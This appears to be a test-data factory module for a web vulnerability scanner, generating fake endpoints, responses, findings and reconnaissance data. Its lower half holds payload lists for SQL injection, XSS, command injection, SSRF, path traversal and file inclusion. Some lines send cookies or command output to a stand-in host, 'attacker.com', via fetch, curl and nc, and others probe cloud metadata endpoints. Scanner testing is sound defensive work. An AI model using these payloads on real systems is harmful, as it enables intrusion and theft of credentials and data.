# tests/factories/factories.py - Factory-boy factories for test data generation

import factory
from faker import Faker
from datetime import datetime, timedelta
import random

fake = Faker()


class EndpointFactory(factory.Factory):
    """Factory for generating test endpoints."""
    
    class Meta:
        model = dict
    
    @staticmethod
    def create(**kwargs):
        """Create a test endpoint dict."""
        endpoint = {
            "url": fake.url(),
            "method": random.choice(["GET", "POST", "PUT", "DELETE", "PATCH"]),
            "path": f"/{fake.slug()}",
            "parameters": {
                fake.slug(): fake.word() for _ in range(random.randint(1, 5))
            },
            "headers": {
                "User-Agent": fake.user_agent(),
                "Content-Type": "application/json"
            },
        }
        endpoint.update(kwargs)
        return endpoint


class ResponseFactory(factory.Factory):
    """Factory for generating mock HTTP responses."""
    
    class Meta:
        model = dict
    
    @staticmethod
    def create(status=200, content_type="text/html", **kwargs):
        """Create a mock HTTP response."""
        response = {
            "status": status,
            "headers": {
                "Content-Type": content_type,
                "Server": random.choice(["nginx/1.18", "Apache/2.4", "IIS/10.0"]),
                "X-Powered-By": random.choice(["PHP/7.4", "ASP.NET", None]),
            },
            "content": fake.sentence().encode(),
            "text": fake.sentence(),
        }
        response.update(kwargs)
        return response

class FindingFactory(factory.Factory):
    """Factory for generating vulnerability findings."""
    
    class Meta:
        model = dict
    
    @staticmethod
    def create(vuln_type="SQL Injection", **kwargs):
        """Create a vulnerability finding."""
        finding = {
            "type": vuln_type,
            "severity": random.choice(["Critical", "High", "Medium", "Low", "Info"]),
            "endpoint": fake.url(),
            "parameter": fake.slug(),
            "method": random.choice(["GET", "POST"]),
            "payload": fake.sentence(),
            "evidence": fake.sentence(nb_words=10),
            "description": fake.paragraph(),
            "remediation": fake.paragraph(),
            "timestamp": datetime.now().isoformat(),
            "confidence": random.choice([0.95, 0.85, 0.75, 0.65]),
        }
        finding.update(kwargs)
        return finding


class TargetFactory(factory.Factory):
    """Factory for generating scan targets."""
    
    class Meta:
        model = dict
    
    @staticmethod
    def create(**kwargs):
        """Create a scan target."""
        hostname = fake.domain_name()
        target = {
            "url": f"https://{hostname}",
            "hostname": hostname,
            "ip": fake.ipv4(),
            "port": random.choice([80, 443, 8080, 8443, 3000, 5000]),
            "is_https": True,
            "paths": [f"/{fake.slug()}" for _ in range(random.randint(5, 20))],
        }
        target.update(kwargs)
        return target


class ReconDataFactory(factory.Factory):
    """Factory for reconnaissance data."""
    
    class Meta:
        model = dict
    
    @staticmethod
    def create(**kwargs):
        """Create reconnaissance data."""
        recon_data = {
            "dns_records": {
                "A": [fake.ipv4() for _ in range(random.randint(1, 3))],
                "MX": [f"mail{i}.{fake.domain_name()}" for i in range(1, 4)],
                "NS": [f"ns{i}.{fake.domain_name()}" for i in range(1, 4)],
            },
            "open_ports": [80, 443, 22, 3389],
            "technologies": {
                "webservers": ["nginx", "Apache"],
                "frameworks": ["Django", "Flask", "Laravel"],
                "languages": ["Python", "PHP", "JavaScript"],
            },
            "waf_detected": random.choice([True, False]),
            "ssl_certificate": {
                "subject": {"commonName": fake.domain_name()},
                "issuer": {"commonName": "Let's Encrypt"},
                "notBefore": (datetime.utcnow() - timedelta(days=365)).isoformat(),
                "notAfter": (datetime.utcnow() + timedelta(days=365)).isoformat(),
            },
        }
        recon_data.update(kwargs)
        return recon_data


def generate_endpoints(count=100, seed=None):
    """Generate multiple test endpoints."""
    if seed:
        random.seed(seed)
        Faker.seed(seed)
    
    return [EndpointFactory.create() for _ in range(count)]


def generate_large_response_set(endpoint_count=1000, findings_per_endpoint=2):
    """Generate a large dataset for performance testing."""
    endpoints = generate_endpoints(endpoint_count)
    findings = []
    
    for endpoint in endpoints:
        for _ in range(random.randint(0, findings_per_endpoint)):
            findings.append(FindingFactory.create(
                endpoint=endpoint.get("url")
            ))
    
    return {
        "endpoints": endpoints,
        "findings": findings,
        "total_endpoints": len(endpoints),
        "total_findings": len(findings),
    }


def create_malformed_responses():
    """Create various malformed HTTP responses for edge case testing."""
    return {
        "truncated": ResponseFactory.create(
            text="<html><body><p>Incomplete HTML without closing"
        ),
        "invalid_utf8": ResponseFactory.create(
            content=b"\x80\x81\x82\x83"
        ),
        "no_headers": ResponseFactory.create(
            headers={}
        ),
        "binary_as_html": ResponseFactory.create(
            content=bytes(range(256))
        ),
        "large_response": ResponseFactory.create(
            text="X" * (100 * 1024 * 1024)  # 100MB
        ),
        "null_bytes": ResponseFactory.create(
            text="Hello\x00World\x00Test"
        ),
    }


# Payload definitions organized by vulnerability type

BLIND_SQLI_PAYLOADS = [
    "' AND SLEEP(5)-- -",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
    "1' UNION SELECT SLEEP(5),2-- -",
    "' AND BENCHMARK(10000000,SHA1('test'))-- -",
    "' AND WAITFOR DELAY '00:00:05'-- -",
    "1' AND SLEEP(IF(1=1,5,0))-- -",
    "' OR SLEEP(5)-- -",
    "'; WAITFOR DELAY '00:00:05'-- -",
    "1'; SELECT SLEEP(5)-- -",
    "' UNION ALL SELECT SLEEP(5),NULL,NULL,NULL-- -",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0-- -",
    "' UNION SELECT NULL,SLEEP(5),NULL FROM users-- -",
    "' AND EXISTS(SELECT * FROM users WHERE username LIKE 'a%')-- -",
    "' UNION SELECT 1,SLEEP(5),3,4,5,6,7,8,9-- -",
    "' OR 1=(SELECT COUNT(*) FROM information_schema.tables)-- -",
]

DOM_XSS_PAYLOADS = [
    '"><img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<img src=x onerror="fetch(\'http://attacker.com?cookie=\'+document.cookie)">',
    '<iframe src="javascript:alert(1)">',
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<embed src=x onerror=alert(1)>',
    '<object data=x onerror=alert(1)>',
    '<form onsubmit=alert(1)><input type=submit>',
    '<select onfocus=alert(1) autofocus>',
    '<table><tr><td background="javascript:alert(1)"></td></tr></table>',
]

COMMAND_INJECTION_BLIND_PAYLOADS = [
    '; sleep 5 #',
    '| sleep 5',
    '`sleep 5`',
    '$(sleep 5)',
    '| ping -c 5 127.0.0.1',
    '; nslookup attacker.com #',
    '| curl http://attacker.com/$(whoami)',
    '`host attacker.com`',
    '; timeout 5 & echo done',
    '| (sleep 5; echo done)',
    '; sleep 5 &',
    '| head -c 1 /dev/zero | od -A n -t x1 | head -c 2000000',
    '; dd if=/dev/zero bs=1024 count=5000000 | nc attacker.com 9999',
    '| cat /dev/urandom | timeout 5 nc attacker.com 9999',
    '; strace -e trace=network sleep 5',
]

SSRF_BYPASS_PAYLOADS = [
    "http://127.0.0.1:8080",
    "http://localhost:8080",
    "http://[::1]:8080",
    "http://[::ffff:127.0.0.1]:8080",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://0.0.0.0:8080",
    "http://0x7f000001:8080",
    "http://2130706433:8080",
    "http://[2001:db8::1]/",
    "http://169.254.169.254.nip.io/",
    "http://127.0.0.1%40attacker.com@attacker.com",
    "http://127.0.0.1.nip.io",
    "http://localhost.localdomain:8080",
    "http://127.0.0.1:@attacker.com@127.0.0.1:80/",
]

ENCODING_BYPASS_PAYLOADS = [
    # URL Encoding variations
    {
        "original": "' OR '1'='1",
        "double_url": "%27%20%4F%52%20%27%31%27%3D%27%31",
        "mixed_case": "%27%20or%20%27%31%27%3d%27%31",
        "unicode": "%u0027%20OR%20%u0027%31%u0027%3D%u0027%31",
    },
    # HTML Entity encoding
    {
        "original": "<img onerror=alert(1)>",
        "entity": "&lt;img onerror=alert(1)&gt;",
        "hex": "&#x3C;img onerror=alert(1)&#x3E;",
        "decimal": "&#60;img onerror=alert(1)&#62;",
    },
    # Null byte injection
    {
        "original": "../../../etc/passwd",
        "null_byte": "..\\..\\..\\etc\\passwd%00.jpg",
    },
]

PATH_TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "....%252f....%252f....%252fetc%252fpasswd",
    "..%255c..%255c..%255cwindows%255cwin.ini",
]

FILE_INCLUSION_PAYLOADS = [
    "php://filter/convert.base64-encode/resource=index",
    "php://input",
    "zip://path/to/archive.zip%23internal.php",
    "phar://archive.phar/internal.php",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
    "expect://id",
    "/proc/self/environ",
    "/proc/self/fd/3",
    "/var/log/apache2/access.log",
]

CSRF_TOKEN_PATTERNS = [
    {
        "name": "Hidden input field",
        "pattern": '<input type="hidden" name="csrf_token" value="[^"]*">',
        "extraction_method": "html_input",
    },
    {
        "name": "Custom header",
        "pattern": "X-CSRF-Token: [^\\n]*",
        "extraction_method": "header",
    },
    {
        "name": "Cookie based",
        "pattern": "CSRF-TOKEN=[^;]*",
        "extraction_method": "cookie",
    },
]
